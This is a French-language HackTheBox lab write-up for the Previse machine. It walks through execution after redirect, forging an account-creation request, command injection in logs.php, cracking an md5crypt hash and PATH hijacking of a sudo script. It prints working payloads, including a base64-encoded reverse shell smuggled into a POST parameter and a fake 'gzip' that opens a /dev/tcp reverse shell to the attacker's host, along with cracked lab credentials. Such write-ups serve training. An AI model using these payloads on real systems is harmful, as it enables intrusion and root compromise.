---
title: HTB | Previse
description: Previse is a easy machine that showcases Execution After Redirect (EAR) which allows users to retrieve the contents and make requests to accounts.php whilst unauthenticated which leads to abusing PHP's exec() function since user inputs are not sanitized allowing remote code execution against the target, after gaining a www-data shell privilege escalation starts with the retrieval and cracking of a custom MD5Crypt hash which consists of a unicode salt and once cracked allows users to gain SSH access to the target then abusing a sudo executable script which does not include absolute paths of the functions it utilises which allows users to perform PATH hijacking on the target to compromise the machine.
slug: previse-htb
date: 2025-03-06 00:00:00+0000
#image: cover.png
categories:
 - HackTheBox
tags:
 - Linux
 - Easy
#weight: 1
---

<table style="border:none; width:100%;">
  <tr>
    <!-- Colonne gauche : logo -->
    <td style="border:none; text-align:center; vertical-align:middle; width:150px;">
      <img src="cover.png" alt="Previse cover" width="120">
    </td>
    <td style="border:none; text-align:center; vertical-align:middle;">
      <table style="margin:auto; border-collapse:collapse; border:1px solid #ddd;">
        <thead>
          <tr>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Machine name</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">OS</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">IP</th>
            <th style="padding:8px; border:1px solid #ddd; text-align:center;">Difficulty</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Previse</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Linux</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">10.10.11.104</td>
            <td style="padding:8px; border:1px solid #ddd; text-align:center;">Easy</td>
          </tr>
        </tbody>
      </table>
    </td>
  </tr>
</table>

## Users
```bash
m4lwhere:ilovecody112235!
```

## Enumeration

### nmap
```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -An -T4 -vvv 10.10.11.104
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDbdbnxQupSPdfuEywpVV7Wp3dHqctX3U+bBa/UyMNxMjkPO+rL5E6ZTAcnoaOJ7SK8Mx1xWik7t78Q0e16QHaz3vk2AgtklyB+KtlH4RWMBEaZVEAfqXRG43FrvYgZe7WitZINAo6kegUbBZVxbCIcUM779/q+i+gXtBJiEdOOfZCaUtB0m6MlwE2H2SeID06g3DC54/VSvwHigQgQ1b7CNgQOslbQ78FbhI+k9kT2gYslacuTwQhacntIh2XFo0YtfY+dySOmi3CXFrNlbUc2puFqtlvBm3TxjzRTxAImBdspggrqXHoOPYf2DBQUMslV9prdyI6kfz9jUFu2P1Dd
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBCnDbkb4wzeF+aiHLOs5KNLPZhGOzgPwRSQ3VHK7vi4rH60g/RsecRusTkpq48Pln1iTYQt/turjw3lb0SfEK/4=
|   256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIICTOv+Redwjirw6cPpkc/d3Fzz4iRB3lCRfZpZ7irps
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-favicon: Unknown favicon MD5: B21DD667DF8D81CAE6DD1374DD548004
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-title: Previse Login
|_Requested resource was login.php
```

## Foothold

### Website with bad redirection
Le site web nous empeche de voir certaines pages et nous demande de nous authentifier sur la page de login.php.
Cependant, on observe qu'en vérité on recoit quand meme le code source de la page, avant d'etre redirigé !
On peut donc capturer la plupart des pages, detecter avec gobuster, et les ouvrir dans burp.
Ensuite, on a acces a une page sur lequel on peut créer un compte. On forge donc une requete POST depuis burp pour créer un nouveau compte. Enfin, on peut se connecter de manière classique sur le site web avec notre nouveau compte
```bash
POST /accounts.php HTTP/1.1
Host: 10.10.11.104
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 51
Origin: http://10.10.11.104
Connection: keep-alive
Referer: http://10.10.11.104/login.php
Cookie: PHPSESSID=u7bqrqlp12dv65ple4ev2q1glr
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=leopold&password=password&confirm=password
```

### files.php - siteBackup.zip
On trouve un zip avec tout le code du site web. On a notammment les creds mysql.
```bash
<?php

function connectDB(){
    $host = 'localhost';
    $user = 'root';
    $passwd = 'mySQL_p@ssw0rd!:)';
    $db = 'previse';
    $mycon = new mysqli($host, $user, $passwd, $db);
    return $mycon;
}

?>
```

### logs.php code injection
Dans le fichier logs.php on découvre l'utilsation d'une variable $_POST['delim'] dans la fonction. On peut executer un shell facilement. On met en base64 le shell pour facilité l'execution de la commande:

POST /logs.php
...
delim=space;ech'/'o+c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkvMTMzNyAwPiYx+|+base64+-d+|+bash

```bash
<?php
if (!$_SERVER['REQUEST_METHOD'] == 'POST') {
    header('Location: login.php');
    exit;
}

/////////////////////////////////////////////////////////////////////////////////////
//I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER//
/////////////////////////////////////////////////////////////////////////////////////

$output = exec("/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}");
echo $output;

$filepath = "/var/www/out.log";
$filename = "out.log";    

if(file_exists($filepath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');

-----------------------------

┌──(kali㉿kali)-[~/htb/Previse/siteBackup]
└─$ nc -lnvp 1337
listening on [any] 1337 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.104] 60650
sh: 0: can't access tty; job control turned off
$ whoami
www-data
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@previse:/var/www/html$ 

www-data@previse:/var/www/html$ 

www-data@previse:/var/www/html$ export TERM=xterm
export TERM=xterm
www-data@previse:/var/www/html$ ^Z
zsh: suspended  nc -lnvp 1337
```

### m4lwhere - mysql db
On se connecte avec mysql et les creds recupérés dans config.php
```bash
mysql> select * from accounts;
+----+----------+------------------------------------+---------------------+
| id | username | password                           | created_at          |
+----+----------+------------------------------------+---------------------+
|  1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 |
|  2 | leopold  | $1$🧂llol$79cV9c1FNnnr7LcfPFlqQ0 | 2025-03-05 17:01:15 |
+----+----------+------------------------------------+---------------------+
```
On casse le hash avec hashcat (md5crypt --> -m 500) :
```bash
$ hashcat -m 500 ./hash.txt ~/wordlists/rockyou.txt --show
$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.:ilovecody112235!
```
Connection en ssh :
```bash
┌──(kali㉿kali)-[~/htb/Previse/siteBackup]
└─$ ssh m4lwhere@10.10.11.104           
m4lwhere@10.10.11.104's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-151-generic x86_64)

...

Last login: Fri Jun 18 01:09:10 2021 from 10.10.10.5
m4lwhere@previse:~$ ls
user.txt
m4lwhere@previse:~$ cat user.txt 
ccde.....f7fd
```

## Privilege Escalation

### access_backup.sh as root
sudo -l --> on observe le fichier **/opt/scripts/access_backup.sh** que l'on peut executer en tant que root
On voit qu'il fait appel à la commande "gzip".
```bash
m4lwhere@previse:~/bin$ sudo -l
User m4lwhere may run the following commands on previse:
    (root) /opt/scripts/access_backup.sh
m4lwhere@previse:~/bin$ cat /opt/scripts/access_backup.sh 
#!/bin/bash

# We always make sure to store logs, we take security SERIOUSLY here

# I know I shouldnt run this as root but I cant figure it out programmatically on my account
# This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time

gzip -c /var/log/apache2/access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_access.gz
gzip -c /var/www/file_access.log > /var/backups/$(date --date="yesterday" +%Y%b%d)_file_access.gz
```
On peut facilement executer n'importe quelle commande en tant que root en modifiant le PATH.
On crée un dossier bin dans le /home. On y met un fichier avec le nom "gzip" et la commande pour ouvrir un reverse shell dedans.
Enfin, on ajoute le dossier "bin" actuel en 1ere place dans le PATH.
Lorsque l'on va executer en tant que root le script access_backup.sh, il va chercher où se trouve le binaire gzip pour l'executer.
Le 1er dossier qu'il va fouiller est le notre que l'on vient d'ajouter contenant le faux gzip. Il va donc l'executer, au lieu du véritable gzip et ouvrir notre reverse shell en tant que root.
```bash
m4lwhere@previse:~/bin$ pwd
/home/m4lwhere/bin
m4lwhere@previse:~/bin$ export PATH=/home/m4lwhere/bin:$PATH
m4lwhere@previse:~/bin$ vim gzip
m4lwhere@previse:~/bin$ chmod +x gzip 
m4lwhere@previse:~/bin$ cat gzip 
#!/bin/bash
sh -i >& /dev/tcp/10.10.14.19/6666 0>&1
m4lwhere@previse:~/bin$ sudo /opt/scripts/access_backup.sh 

-----------------------------------------

┌──(kali㉿kali)-[~/htb/Previse/siteBackup]
└─$ nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.19] from (UNKNOWN) [10.10.11.104] 50272
# whoami
root
# cat /root/root.txt
3ed1.....e90e
```